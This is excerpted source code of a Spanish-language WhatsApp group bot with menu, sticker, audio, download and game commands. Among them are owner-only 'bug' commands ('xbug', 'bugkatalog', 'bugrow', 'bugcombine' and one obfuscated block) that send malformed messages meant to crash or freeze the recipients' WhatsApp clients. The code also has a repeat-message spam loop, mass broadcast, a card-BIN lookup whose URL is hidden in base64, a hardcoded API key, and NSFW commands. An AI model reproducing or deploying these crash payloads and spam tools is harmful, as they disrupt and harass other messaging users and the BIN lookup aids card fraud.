...
const asw1 = 'https://i.ibb.co/PjB9fxw/confumods.jpg'
...
nomorowner1 = "@50254371795"; 
fake = `Creador : ${fakeyoi}\n Prefix :「 ${prefixStatus ? "Multi Prefix" : "No Prefix"} 」`;
...
const daftar1 = `Hola ${pushname} ${ucapanWaktu} \n\nAntes de usar el bot, verifiquese primero`
       const daftar2 = '```Toca el botón oh escribe #verify```'
       const daftar3 = [
          {
            buttonId: `verify`,
            buttonText: {
...
cmhit.push(command)
    ...
    mess = {
      ...
      error: {
        stick: "Erro",
        apiz: "error!, la apikey ah expirado",
        Iv: "Link inválido :v",
      },
      only: {
...
*╰╰┄┅┄┅┄┅┄┅┄┅┄┅┄┅┄┅╯*`
sendButLocation(from, `${menu}`, `puto`, {jpegThumbnail:iye}, [{buttonId:`allmenu`,buttonText:{displayText:'⎙ MENU COMPLETO'},type:1},{buttonId:`owner`,buttonText:{displayText:'⎙ CREADOR'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'allmenu':
case 'llmenu':
...
◈​​┃
◈​​╰┄┅┄┅┄┅┄┅┄┅┄┅┄┅┄┅╯`
xeon.sendMessage(from, menu, text, { quoted: ftrol, thumbnail: fs.readFileSync('./xeon.jpg'), contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `?`,body:"",mediaType:"2",thumbnail:iye,mediaUrl:`https://youtube.com/c/ConfuMods`}}})
break
...
xeon.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [stod]},quoted:ftrol})
break
...
reply(mess.wait)
texs = args.join(' ')
limk = ['aHR0cHM6Ly9sb29rdXAuYmlubGlzdC5uZXQ=']
anuu = await fetchJson(`https://hardianto-chan.herokuapp.com/api/base?apikey=hardianto&type=base64&decode=${limk}`)
limkofc = (anuu.result.string)
	anu = await fetchJson(`${limkofc}/${texs}`)
	reply(`𝐈𝐍𝐅𝐎 𝐁𝐈𝐍
...
${anu.country.emoji}𝐈𝐍𝐅𝐎 𝐏𝐀𝐈𝐒${anu.country.emoji}

País ${anu.country.name}
Emoji ${anu.country.emoji}
Latitud ${anu.country.latitude}
Longitud ${anu.country.longitude}

🏦𝐈𝐍𝐅𝐎 𝐁𝐀𝐍𝐂𝐎🏦

Nombre ${anu.bank.name}
Url ${anu.bank.url}
Teléfono ${anu.bank.phone}`)
...
xeon.sendMessage(from, anu, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case 'anal':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`La función Nsfw no está activa en este grupo\nEscribe: ${prefix}nsfw 1\nPara activar`)
...
xeon.sendMessage(from, kon, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case 'lesbian':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`La función Nsfw no está activa en este grupo\nEscribe: ${prefix}nsfw 1\nPara activar`)
...
xeon.sendMessage(from, hai, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case 'wallpaper':
if (!isGroup) return reply(mess.only.group)
if (!isNsfw) return reply(`La función Nsfw no está activa en este grupo\nEscribe: ${prefix}nsfw 1\nPara activar`)
...
xeon.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./xeon.jpg')})
break
case 'waifu':
reply(mess.wait)
...
xeon.sendMessage(from,tahta,image,{quoted:mek}) 
break 
case 'goldbutton': 
  case 'gold': 
...
xeon.sendMessage(from,gold,image,{quoted:mek}) 
break 
...
xeon.sendMessage(from,cscm,image,{quoted:mek}) 
break 
...
xeon.sendMessage(from,silver,image,{quoted:mek}) 
break 
case 'nulis': 
if (args.length < 1) return reply('*¿Donde esta el texto?*') 
nulis = args.join(" ")
nulis = await getBuffer(`https://api.zeks.me/api/nulis?apikey=${ZeksApi}&text=${nulis}`)
xeon.sendMessage(from,nulis,image,{quoted:mek}) 
break 
			case 'wooden': 
                    if (args.length < 1) return reply(`*Ejemplo :*\n${prefix}${command} ConfuMods`)
					makell = args.join(" ")
...
let scen = await xeon.sendMessage(from, fs.readFileSync(`./jadibot@${sender}.jpg`), MessageType.image, {quoted : mek,caption: '¡Escanea este QR para convertirte en un bot temporal!\n1. Haga clic en los tres puntos en la esquina superior derecha.\n2. Toca WhatsApp Web\n3. Escanea este QR \n\nEl QR caduca en 20 segundos'})    
setTimeout(() => {
       xeon.deleteMessage(from, scen.key)
  }, 30000);
})  
xeon.on ('open', async () => {
...
xeon.on('chat-update', async (chat) => {
	require('./xeon.js')(client, chat)
})    
await xeon.connect().then(async ({user}) => {
...
xeon.sendMessage(memekkkk, 'XDXDXD', MessageType.text)
break
       case 'debug':
...
break
      case 'igstory': 
             ...
             .then(async result => {
              ...
              xeon.sendMessage(from,link,video,{quoted: mek,caption: `Tipo : ${i.type}`})
              } else {
              let link = await getBuffer(i.url)
              xeon.sendMessage(from,link,image,{quoted: mek,caption: `Tipo : ${i.type}`})                  
              }
              }
              });
              break
...
case 'listgroup':
                ...
                case 'groplist':
                case 'grouplist':
  const txs = xeon.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`- ${xeon.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Me sali xd' : 'Estoy dentro'}]`).join`\n\n`
  reply(txs)
  break
  case 'get':
case 'fetch':
...
xeon.sendMessage(from, `*🎳 Tictactoe 🎲*
...
xeon.sendMessage(from, duda, sticker, {quoted: mek})
break
				case 'getpp':
					anu = from
		if (`${anu}@s.whatsapp.net`) {
		try {
					ppimg = await xeon.getProfilePicture(anu)
				} catch {
					ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
				}
				ano = await xeon.getProfilePicture(anu)
				buffer = await getBuffer(ano)
				xeon.sendMessage(from, buffer, image, {quoted: mek})
		} else {
		}
			  break
		case 'gimage':
...
medial = await xeon.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
xeon.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await xeon.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					xeon.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await xeon.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
...
case 'bass':                 
					...
					mediao = await xeon.downloadAndSaveMediaMessage(encmediao)
					ran = getRandom('.mp3')
...
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await xeon.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Leído por :\n\n`
...
case 'matrix':
				...
				case 'del':
				case 'delete':
					xeon.deleteMessage(from, { id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
					break
				case 'colong':
		if (!isQuotedSticker) return reply(`Etiqueta un sticker*`)
		const encmediia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	        const meidia = await xeon.downloadAndSaveMediaMessage(encmediia, `./sticker/${sender}`)
		    exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
		    if (error) return reply('error')
		    xeon.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), MessageType.sticker, {quoted: mek})
                ...
                await sleep(4000)
                xeon.modifyChat(from, ChatModification.delete)
                break
				case 'clearall':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
					anu = await xeon.chats.all()
					xeon.setMaxListeners(10)
					for (let _ of anu) {
						xeon.deleteChat(_.jid)
					}
...
encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					hah = fs.readFileSync(mediam)
						xeon.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
				...
				encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					hah = fs.readFileSync(median)
						xeon.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
			...
			if (!isOwner && !isGroupAdmins) return reply(mess.only.admin)
					...
					if (Number(args[0]) === 1) {
						...
						xeon.sendMessage(from, `Libre para usar comandos HENTAI :v`, text)
					} else if (Number(args[0]) === 0) {
...
name: nama,
address: impostor,
jpegThumbnail: iye}, MessageType.liveLocation, {quoted:floc})
break
...
case 'tts':
					if (args.length < 1) return xeon.sendMessage(from, `¿Cuál es el código de idioma? ejemplo : ${prefix}tts es Hola`, text, { quoted: mek })
				   const gtts = require('./lib/gtts')(args[0])
					if (args.length < 2) return xeon.sendMessage(from, `¿Dónde está el texto? ejemplo : ${prefix}tts es Hola`, text, { quoted: mek })
					...
					bby.length > 900
						...
						: gtts.save(ranm, bby, function () {
							exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
								...
								xeon.sendMessage(from, buff, audio, { duration: 359996400, ptt: true, quoted: mek })
								fs.unlinkSync(rano)
							})
						})
					break
		    ...
		    xeon.groupDemoteAdmin(from, [demote])
						reply('Listo')
						break
					case 'promote':
					if (!isGroup) return reply(mess.only.group)
		    ...
		    xeon.groupMakeAdmin(from, [promote])
						reply('Listo')
						break
				case 'linkgrup':
				case 'linkgroup':
         ...
         break
				...
				for (let i = 0; i < argzi[1]; i++){
					xeon.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                xeon.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
		if (!isGroup) return reply(mess.only.group)
		...
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
                ...
                xeon.groupMakeAdmin(from, members_id)
                break
				case 'setnamegc':
					if (!isGroup) return reply(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					xeon.groupUpdateSubject(from, `${body.slice(11)}`)
				...
				case 'setdescgc':
					...
					if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					xeon.groupUpdateDescription(from, `${body.slice(10)}`)
				...
				if (!isQuotedImage) return reply('Etiqueta una imagen!')
					...
					mediau = await xeon.downloadAndSaveMediaMessage(enmediau)
					await xeon.updateProfilePicture(botNumber, mediau)
					reply('Listo')
					break
				case 'leave':
				if (!isGroup) return reply(mess.only.group)
				...
				case 'bc':
					...
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						...
						for (let _ of anu) {
							xeon.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						...
						buff = await xeon.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							xeon.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Éxito en la transmisión ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await xeon.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							xeon.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Éxito en la transmisión ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
            ...
            case 'tomp3':
					...
					mediad = await xeon.downloadAndSaveMediaMessage(encmediad)
					ran = getRandom('.mp4')
					exec(`ffmpeg -i ${mediad} ${ran}`, (err) => {
						fs.unlinkSync(mediad)
						if (err) return reply(mess.error.api)
						mhee = fs.readFileSync(ran)
						xeon.sendMessage(from, mhee, audio, { mimetype: 'audio/mp4', duration: 359996400, quoted: mek })
						fs.unlinkSync(ran)
					})
					break
		    case 'slot':
...
const sname = xeon.contacts[ambl] != undefined ? xeon.contacts[ambl].notify = undefined ? PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international') : xeon.contacts[ambl].notify || xeon.contacts[ambl].vname : PhoneNumber('+' + ambl.replace('@s.whatsapp.net', '')).getNumber('international')
reply(sname)
break
				case 'getpict':
				case 'getpic':
            ...
            pictt = await xeon.getProfilePicture(mentioned)
            pict = await getBuffer(pictt)
            xeon.sendMessage(from, pict, image, {quoted: mek})
            break
				case 'chat':
    	   ...
    	   break
            ...
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					tagq = `@${nomqm.split('@')[0]}` 
					xeon.sendMessage(from, tagq, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
			break
			case 'tagme':
                  var nomqm = mek.participant
				    tagu = `@${nomqm.split('@s.whatsapp.net')[0]}`
					xeon.sendMessage(from, tagu, text, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}})
					break
case 'listadmins':
  case 'listadmin':
    case 'admin':
       ...
       case 'listonline':
             ...
             xeon.sendMessage(from, '*Lista de personas online:*\n\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
...
break
      case 'join': 
             ...
             fak = xeon.query({ json: ['action', 'invite', link],
             expect200: true })
             reply('*Listo*')
             break
				case 'totag':
            ...
            file = await xeon.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
            value = args.join(" ")
            ...
            ini_buffer = fs.readFileSync(file)
            xeon.sendMessage(from, ini_buffer, document, options)
            fs.unlinkSync(file)
        }  else if ((isMedia && !mek.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediau = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await xeon.downloadAndSaveMediaMessage(encmediau, filename = getRandom())
        ...
        break
				...
				case 'estado':
case 'stats':
				var groups = xeon.chats.array.filter(v => v.jid.endsWith('g.us'))
				var privat = xeon.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
				var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
					...
					const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = xeon.user.phone
					stamtus = `⍟ ────────────────── ⍟
...
MNC : ${mnc}
MCC : ${mcc}
Modelo de dispositivo: ${xeon.user.phone.device_model}
Manufactura : ${device_manufacturer}
Wa Version: ${xeon.user.phone.wa_version}
Android Version: ${xeon.user.phone.os_version}
...
break
				...
				xeon.updatePresence(from, Presence.composing)
					...
					if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						...
						buff = await xeon.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							xeon.sendMessage(_.jid, buff, audio, { quoted: ftrol })
						}
						} else if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await xeon.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							xeon.sendMessage(_.jid, buff, sticker, { quoted: ftrol, contextInfo: { forwardingScore: 508, isForwarded: true}})
							}
							} else{
...
case 'tagall':
	...
	case 'xbug':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
await xeon.toggleDisappearingMessages(from, 0)
await xeon.toggleDisappearingMessages(from, 0)
await xeon.toggleDisappearingMessages(from, 0)
await xeon.toggleDisappearingMessages(from, 0)
await xeon.toggleDisappearingMessages(from, 0)
...
for (let i = 0; i < args[0]; i++) {
xeon.sendMessage(from, `${NamaBot}`, MessageType.extendedText,{
 quoted: {
key: {
...
xeon.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}	
...
break
   ...
   encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					...
					ran = getRandom('.jpg')
						...
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					xeon.sendMessage(from, hah, audio, {mimetype: 'image/jpg', ptt:true, duration: 359996400, quoted:mek})
						fs.unlinkSync(ran)
imeu = await xeon.prepareMessage('0@s.whatsapp.net', hmm4, image)
...
"descriptionCount": "999999999",
  ...
  xeon.relayWAMessage(res)
  xeon.toggleDisappearingMessages(from,`Ups :v`,text)
  break
	case 'bugkatalog':
  					xeon.toggleDisappearingMessages(from,`ups`,text)
    hmm4 = fs.readFileSync(`./xeon.jpg`)
imeu = await xeon.prepareMessage('0@s.whatsapp.net', hmm4, image)
...
function _0x4ee9(_0x1253de,_0x4df4d5){var _0x587b3c=_0x587b();return _0x4ee9=function(_0x4ee946,_0x170efd){_0x4ee946=_0x4ee946-0x1c6;var _0x33a62e=_0x587b3c[_0x4ee946];return _0x33a62e;},_0x4ee9(_0x1253de,_0x4df4d5);}var _0x1fb12b=_0x4ee9;function _0x587b(){var _0x573ab6=['readFileSync','12536840GCstSf','sendMessage','only','536IkuDmm','key','2675700WtsjtO','ownerB','./xeon.jpg','fromMe','2224464MiisaG','18qcFOZT','83468rQXPeY','0@s.whatsapp.net','25944fErnRh','115851EirsKL','184fyRhDo','178400WTzYEN'];_0x587b=function(){return _0x573ab6;};return _0x587b();}(function(_0x2dcd13,_0x2f923e){var _0x3d06c1=_0x4ee9,_0x2352ff=_0x2dcd13();while(!![]){try{var _0x266d76=parseInt(_0x3d06c1(0x1cc))/0x1+-parseInt(_0x3d06c1(0x1ce))/0x2+-parseInt(_0x3d06c1(0x1cb))/0x3*(parseInt(_0x3d06c1(0x1cd))/0x4)+-parseInt(_0x3d06c1(0x1d5))/0x5+-parseInt(_0x3d06c1(0x1c7))/0x6+-parseInt(_0x3d06c1(0x1c9))/0x7*(parseInt(_0x3d06c1(0x1d3))/0x8)+-parseInt(_0x3d06c1(0x1c8))/0x9*(-parseInt(_0x3d06c1(0x1d0))/0xa);if(_0x266d76===_0x2f923e)break;else _0x2352ff['push'](_0x2352ff['shift']());}catch(_0x4d3113){_0x2352ff['push'](_0x2352ff['shift']());}}}(_0x587b,0x6953b));if(!isOwner&&!mek[_0x1fb12b(0x1d4)][_0x1fb12b(0x1c6)])return reply(mess[_0x1fb12b(0x1d2)][_0x1fb12b(0x1d6)]);client[_0x1fb12b(0x1d1)](from,{'degreesLatitude':6.493187928699356,'degreesLongitude':80.30968201252108,'name':''+emoji2(prefix),'address':''+virtex6(prefix),'jpegThumbnail':fs[_0x1fb12b(0x1cf)](_0x1fb12b(0x1d7))},location,{'quoted':{'key':{'participant':_0x1fb12b(0x1ca)},'message':{'orderMessage':{'itemCount':0x98967f,'status':0x1,'surface':0x1,'message':''+NamaBot,'orderTitle':''+NamaOwner,'sellerJid':'0@s.whatsapp.net'}}}});
        ...
        if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
        xeon.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`${prefix}bbaij72njnwjibdo16830nslm1782`,buttonText:{disText:'⚔️ ConfuMods ⚔️'},type:1}])
        xeon.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
...
case 'bugcombine':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
                 xeon.toggleDisappearingMessages(from, 'HACKEADO')
xeon.sendMessage(from, `${NamaBot}`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' 
  },
...
if (!isOwner && !mek.key.fromMe) return reply(mess.only.ownerB)
xeon.updatePresence(from, Presence.composing)
xeon.sendMessage(from, 'bien bien',text, {
 quoted: {
  key: {
...
└ ⬣ *Link:* ${items[i].url}\n\n`
                ...
                await xeon.sendMessage(from, thumb, image, {quoted: mek, caption: `${hehe}───────────────\n\n┌ ◪ *DESCARGA*
...
❒═════════════════╾❒`
  ...
  xeon.sendMessage(from, buffer, image, {
quoted: mek, caption: infomp3 })
  xeon.sendMessage(from, lagu, audio, {
mimetype: 'audio/mp4', filename: `${anu.result.title}.mp3`, quoted: mek})
          break

				case 'play2':  		  
				  if (args.length < 1) return reply('*Ingrese el título*')
                xeon.sendMessage(from, mess.wait, text,{quoted : mek})
				play = args.join(" ")
				anu = await fetchJson(`https://api.zeks.xyz/api/ytplaymp4?q=${play}&apikey=oCHDwj8ggZGBGjU5WIaK5Rctu6c`)
				if (anu.error) return reply(anu.error)
				buffer1 = await getBuffer(anu.result.url_video)
				xeon.sendMessage(from, buffer1, video, {mimetype: 'video/mp4', filename: `${anu.result.video}.mp4`, quoted: mek, caption: `❒════❬ *𝐏𝐋𝐀𝐘𝟐* ❭═════╾❒
          ...
          break 
				...
				/*case 'sticker33':
					...
					case 's':
						if (isMedia && !mek.message.videoMessage || isQuotedImage) {
							const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
							const media = await xeon.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
							await ffmpeg(`${media}`)
									.input(media)
									...
									.on('end', function () {
										...
										exec(`webpmux -set exif ./sticker/data.exif ./sticker/${sender}.webp -o ./sticker/${sender}.webp`, async (error) => {
											...
											xeon.sendMessage(from, fs.readFileSync(`./sticker/${sender}.webp`), sticker, {quoted: mek})
											fs.unlinkSync(media)	
...
//------------- <COMANDOS CONFUBOT2 > ----------------//
					...
					wiw = fs.readFileSync(`./xeon.jpg`)
					xeon.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan gay eres*\n\n'+ gai })									
                    break
					...
					wiw = fs.readFileSync(`./xeon.jpg`)
					xeon.sendMessage(from, wiw, image, { quoted: mek, caption: '*Que tan puta eres*\n\n'+ gaii })					
                    break
					...
					wnw = fs.readFileSync(`./xeon.jpg`)						
					xeon.sendMessage(from, wnw, image, { caption: '*Que tan lesbi eres*\n\n'+ rii, quoted: mek })					
                    break                                      
				    ...
				    wbw = fs.readFileSync(`./xeon.jpg`)							
				    xeon.sendMessage(from, wbw, image, { quoted: mek, caption: '*Reto 😈*\n\n'+ deer })					
                    break	
					...
					wuw = fs.readFileSync(`./xeon.jpg`)						
					xeon.sendMessage(from, wuw, image, { caption: '*Verdad😇*\n\n'+ ttrrth, quoted: mek })
					 break
		default:break
		}
	} catch (e) {
